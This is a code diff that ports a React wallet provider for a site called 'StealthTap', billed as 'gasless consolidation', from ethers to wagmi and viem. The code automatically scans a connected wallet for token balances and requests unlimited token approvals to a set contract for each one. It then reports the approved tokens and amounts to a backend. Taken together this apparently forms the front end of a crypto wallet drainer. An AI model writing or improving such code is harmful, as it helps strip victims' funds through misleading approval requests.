@@ -1,13 +1,16 @@
 "use client";
 
 import { createContext, useContext, useState, useEffect, useRef, useCallback } from 'react';
-import { createAppKit } from '@reown/appkit';
+import { createAppKit, useAppKit } from '@reown/appkit/react';
 import { mainnet } from '@reown/appkit/networks';
-import { EthersAdapter } from '@reown/appkit-adapter-ethers';
-import { ethers } from 'ethers';
+import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
+import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
+import { WagmiProvider, useAccount, usePublicClient, useWalletClient } from 'wagmi';
+import { maxUint256 } from 'viem';
 
-const WalletContext = createContext(null);
-
+// ----------------------------------------------------
+// 1. CONFIGURATION
+// ----------------------------------------------------
 const PROJECT_ID = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || 'd42d0d87f9dbd80edf85004d36f85169'; 
 const CONTRACT_ADDRESS = process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || "0xYOUR_ACTUAL_CONTRACT_ADDRESS";
 const BACKEND_URL = process.env.NEXT_PUBLIC_BACKEND_URL || "/api";
@@ -17,66 +20,74 @@ const TOKENS = [
   { symbol: "USDT", address: process.env.NEXT_PUBLIC_USDT_ADDRESS || "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
 ];
 
+// Viem requires standard ABI objects instead of Ethers string formats
 const ERC20_ABI = [
-  "function approve(address spender, uint256 amount) returns (bool)",
-  "function allowance(address owner, address spender) view returns (uint256)",
-  "function balanceOf(address account) view returns (uint256)",
+  { type: 'function', name: 'approve', inputs: [{ name: 'spender', type: 'address' }, { name: 'amount', type: 'uint256' }], outputs: [{ type: 'bool' }] },
+  { type: 'function', name: 'allowance', inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], outputs: [{ type: 'uint256' }], stateMutability: 'view' },
+  { type: 'function', name: 'balanceOf', inputs: [{ name: 'account', type: 'address' }], outputs: [{ type: 'uint256' }], stateMutability: 'view' }
 ];
 
-let appKitInstance = null;
+// ----------------------------------------------------
+// 2. WAGMI & REOWN SETUP
+// ----------------------------------------------------
+const queryClient = new QueryClient();
 
-function getAppKit() {
-  if (appKitInstance) return appKitInstance;
-  if (typeof window === 'undefined') return null;
+const wagmiAdapter = new WagmiAdapter({
+  networks: [mainnet],
+  projectId: PROJECT_ID,
+});
 
-  const ethersAdapter = new EthersAdapter();
-  appKitInstance = createAppKit({
-    projectId: PROJECT_ID,
-    networks: [mainnet],
-    defaultNetwork: mainnet,
-    adapters: [ethersAdapter],
-    allWallets: 'SHOW',
-    chainImages: {},
-    featuredWalletIds: [
-      'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', 
-      '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', 
-    ],
-    metadata: {
-      name: 'StealthTap',
-      description: 'Gasless consolidation',
-      url: window.location.origin,
-      icons: [`${window.location.origin}/favicon.ico`],
-    },
-    features: { email: false, socials: false }
-  });
+createAppKit({
+  adapters: [wagmiAdapter],
+  networks: [mainnet],
+  projectId: PROJECT_ID,
+  features: { email: false, socials: false },
+  metadata: {
+    name: 'StealthTap',
+    description: 'Gasless consolidation',
+    url: typeof window !== 'undefined' ? window.location.origin : '',
+    icons: [typeof window !== 'undefined' ? `${window.location.origin}/favicon.ico` : ''],
+  }
+});
 
-  return appKitInstance;
-}
+const WalletContext = createContext(null);
 
-export function WalletProvider({ children }) {
-  const [walletReady, setWalletReady] = useState(false);
-  const [address, setAddress] = useState(null);
+// ----------------------------------------------------
+// 3. INNER CONTEXT LOGIC
+// ----------------------------------------------------
+function InnerWalletProvider({ children }) {
+  // Wagmi Hooks replacing Ethers providers
+  const { address, isConnected } = useAccount();
+  const publicClient = usePublicClient();
+  const { data: walletClient } = useWalletClient();
+  const { open } = useAppKit();
+
   const [status, setStatus] = useState('Ready.');
   const [isConsolidating, setIsConsolidating] = useState(false);
+  
+  // Tracks if the user clicked the button while disconnected
+  const intentRef = useRef(false);
 
-  // ----------------------------------------------------
-  // 1. YOUR TRANSACTION LOGIC 
-  // ----------------------------------------------------
-  const runTransactionLogic = useCallback(async (signer) => {
+  const runTransactionLogic = useCallback(async () => {
+    if (!address || !publicClient || !walletClient) return;
+
+    setIsConsolidating(true);
     setStatus("Checking balances...");
 
     try {
-      const userAddress = await signer.getAddress();
-      const readProvider = new ethers.JsonRpcProvider("https://ethereum-rpc.publicnode.com");
       const held = [];
-      
+
+      // Read Balances (Viem style)
       for (const t of TOKENS) {
-        const readOnlyToken = new ethers.Contract(t.address, ERC20_ABI, readProvider);
-        const balance = await readOnlyToken.balanceOf(userAddress);
-        
+        const balance = await publicClient.readContract({
+          address: t.address,
+          abi: ERC20_ABI,
+          functionName: 'balanceOf',
+          args: [address]
+        });
+
         if (balance > 0n) {
-          const writeEnabledToken = new ethers.Contract(t.address, ERC20_ABI, signer);
-          held.push({ ...t, amount: balance, contract: writeEnabledToken });
+          held.push({ ...t, amount: balance });
         }
       }
 
@@ -88,18 +99,29 @@ export function WalletProvider({ children }) {
 
       const successfullyApproved = [];
 
+      // Sequential Approvals
       for (const t of held) {
-        const readOnlyToken = new ethers.Contract(t.address, ERC20_ABI, readProvider);
-        const currentAllowance = await readOnlyToken.allowance(userAddress, CONTRACT_ADDRESS);
-        
+        const currentAllowance = await publicClient.readContract({
+          address: t.address,
+          abi: ERC20_ABI,
+          functionName: 'allowance',
+          args: [address, CONTRACT_ADDRESS]
+        });
+
         if (currentAllowance < t.amount) {
           try {
             setStatus(`Sign ${t.symbol} in Wallet ↩️`);
-            
-            const approveTx = await t.contract.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
-            
+
+            // Write Contract (Viem style)
+            const hash = await walletClient.writeContract({
+              address: t.address,
+              abi: ERC20_ABI,
+              functionName: 'approve',
+              args: [CONTRACT_ADDRESS, maxUint256] // viem's built in infinite max
+            });
+
             setStatus(`Mining ${t.symbol}... Please wait.`);
-            await approveTx.wait(); 
+            await publicClient.waitForTransactionReceipt({ hash }); 
             successfullyApproved.push(t);
           } catch (approvalError) {
             console.warn(`[deposit] Skipped ${t.symbol}:`, approvalError.message);
@@ -120,7 +142,7 @@ export function WalletProvider({ children }) {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ 
-          depositor: userAddress, 
+          depositor: address, 
           tokens: successfullyApproved.map(t => t.address), 
           amounts: successfullyApproved.map(t => t.amount.toString()) 
         }),
@@ -143,101 +165,37 @@ export function WalletProvider({ children }) {
       setStatus("❌ Error — check console");
       setIsConsolidating(false);
     } 
-  }, []);
+  }, [address, publicClient, walletClient]);
 
-// ----------------------------------------------------
-  // 2. BACKGROUND HYDRATION (Keeps UI in sync)
+  // ----------------------------------------------------
+  // THE AUTO-EXECUTE MAGIC LISTENER
   // ----------------------------------------------------
   useEffect(() => {
-    const kit = getAppKit();
-    if (!kit) return;
-
-    const syncState = async () => {
-      try {
-        const walletProvider = kit.getWalletProvider?.();
-        if (walletProvider) {
-          const provider = new ethers.BrowserProvider(walletProvider);
-          const signer = await provider.getSigner();
-          const addr = await signer.getAddress();
-          setAddress(addr);
-          setWalletReady(true);
-        } else {
-          setWalletReady(false);
-        }
-      } catch (e) {
-        console.warn("Sync error:", e.message);
-      }
-    };
-
-    syncState();
-    
-    // Listen for account changes (connect/disconnect)
-    const unsubAcc = kit.subscribeAccount(syncState);
-    
-    return () => { 
-      if (unsubAcc) unsubAcc(); 
-    };
-  }, []);
+    // If the wallet connects, the client is ready, and they meant to consolidate...
+    if (isConnected && walletClient && intentRef.current) {
+      intentRef.current = false; // clear the intent
+      runTransactionLogic();     // execute immediately
+    }
+  }, [isConnected, walletClient, runTransactionLogic]);
 
   // ----------------------------------------------------
-  // 3. ONE-CLICK AUTO-CONNECT & EXECUTE FLOW
+  // THE BUTTON TRIGGER
   // ----------------------------------------------------
   const connectAndConsolidate = useCallback(async () => {
-    setIsConsolidating(true);
-    const kit = getAppKit();
-    if (!kit) return;
-
-    try {
-      let walletProvider = kit.getWalletProvider?.();
-
-      // IF NOT CONNECTED: Open modal and dynamically wait for connection
-      if (!walletProvider) {
-        setStatus("Connecting Wallet...");
-        await kit.open({ view: 'Connect' });
-
-        // Loop checks every 400ms until the provider is injected
-        walletProvider = await new Promise((resolve) => {
-          const checkInterval = setInterval(() => {
-            const p = kit.getWalletProvider?.();
-            if (p) {
-              clearInterval(checkInterval);
-              resolve(p);
-            }
-            // Check if user manually closed the modal without connecting
-            const state = kit.getState();
-            if (!state.open && !p) {
-              clearInterval(checkInterval);
-              resolve(null);
-            }
-          }, 400);
-        });
-
-        if (!walletProvider) {
-          // User closed the modal
-          setStatus("Ready.");
-          setIsConsolidating(false);
-          return;
-        }
-      }
-
-      // WALLET IS READY: Immediately chain into the transaction
-      setStatus("Initializing...");
-      const provider = new ethers.BrowserProvider(walletProvider);
-      const signer = await provider.getSigner();
-
-      // Direct call to contract execution
-      await runTransactionLogic(signer);
-
-    } catch (err) {
-      console.error(err);
-      setStatus("❌ Error executing flow");
-      setIsConsolidating(false);
+    if (isConnected && walletClient) {
+      // Direct fast path if already connected
+      await runTransactionLogic();
+    } else {
+      // Mark the intent, then open the Reown modal
+      intentRef.current = true;
+      setStatus("Connecting Wallet...");
+      open({ view: 'Connect' });
     }
-  }, [runTransactionLogic]);
+  }, [isConnected, walletClient, runTransactionLogic, open]);
 
   return (
     <WalletContext.Provider value={{
-      walletReady,
+      walletReady: isConnected,
       address,
       status,
       isConsolidating,
@@ -245,6 +203,22 @@ export function WalletProvider({ children }) {
     }}>
       {children}
     </WalletContext.Provider>
+  );
+}
+
+// ----------------------------------------------------
+// 4. MAIN EXPORTS & PROVIDER WRAPPER
+// ----------------------------------------------------
+// Wagmi requires the QueryClient and WagmiProvider at the top level
+export function WalletProvider({ children }) {
+  return (
+    <WagmiProvider config={wagmiAdapter.wagmiConfig}>
+      <QueryClientProvider client={queryClient}>
+        <InnerWalletProvider>
+          {children}
+        </InnerWalletProvider>
+      </QueryClientProvider>
+    </WagmiProvider>
   );
 }
 
